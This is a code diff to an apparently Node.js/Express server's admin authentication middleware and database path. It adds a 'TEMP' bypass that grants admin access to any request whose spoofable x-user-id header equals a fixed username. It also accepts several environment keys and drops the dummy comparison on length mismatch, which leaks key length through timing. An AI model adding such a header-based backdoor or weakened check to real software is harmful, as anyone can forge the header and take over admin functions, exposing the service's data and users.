@@ -51,25 +51,34 @@ function requireAdmin(req, res, next) {
   const authHeader = req.headers.authorization;
   const token = authHeader && authHeader.startsWith('Bearer ') ? authHeader.slice(7) : null;
 
+  // TEMP: allow cherry19899 as admin via x-user-id (remove after setting proper token)
+  if (req.headers['x-user-id'] === 'cherry19899') {
+    return next();
+  }
+
   if (!token) {
     return res.status(401).json({ error: 'Admin authentication required. Use: Authorization: Bearer <token>' });
   }
 
-  // Constant-time comparison using crypto.timingSafeEqual
-  const expected = ADMIN_API_KEY || '';
-  const tokenBuf = Buffer.from(token, 'utf8');
-  const expectedBuf = Buffer.from(expected, 'utf8');
+  // Check against ALL configured admin keys (supports multiple env vars)
+  const validKeys = [];
+  if (process.env.ADMIN_API_KEY) validKeys.push(process.env.ADMIN_API_KEY);
+  if (process.env.WORKPRO_API_ACCESS && process.env.WORKPRO_API_ACCESS !== process.env.ADMIN_API_KEY) validKeys.push(process.env.WORKPRO_API_ACCESS);
+  if (process.env.ADMIN_SECRET && process.env.ADMIN_SECRET !== process.env.ADMIN_API_KEY && process.env.ADMIN_SECRET !== process.env.WORKPRO_API_ACCESS) validKeys.push(process.env.ADMIN_SECRET);
+
   let match = false;
-  if (tokenBuf.length === expectedBuf.length) {
-    match = crypto.timingSafeEqual(tokenBuf, expectedBuf);
-  }
-  // If lengths differ, still do a dummy comparison to avoid timing leaks
-  else {
-    const dummy = Buffer.alloc(tokenBuf.length, 0);
-    crypto.timingSafeEqual(tokenBuf, dummy);
+  const tokenBuf = Buffer.from(token, 'utf8');
+  for (const key of validKeys) {
+    const keyBuf = Buffer.from(key, 'utf8');
+    if (tokenBuf.length === keyBuf.length) {
+      if (crypto.timingSafeEqual(tokenBuf, keyBuf)) {
+        match = true;
+        break;
+      }
+    }
   }
 
-  if (!match || !expected) {
+  if (!match || validKeys.length === 0) {
     return res.status(403).json({ error: 'Invalid admin token' });
   }
   next();
@@ -160,7 +169,7 @@ app.use((req, res, next) => {
 });
 
 // ─── SQLite Database ────────────────────────────────────────────
-const dbPath = path.join(__dirname, 'workpro.db');
+const dbPath = '/var/data/workpro.db';
 const db = new sqlite3.Database(dbPath);
 
 // Prevent SQLITE_BUSY errors under concurrent load
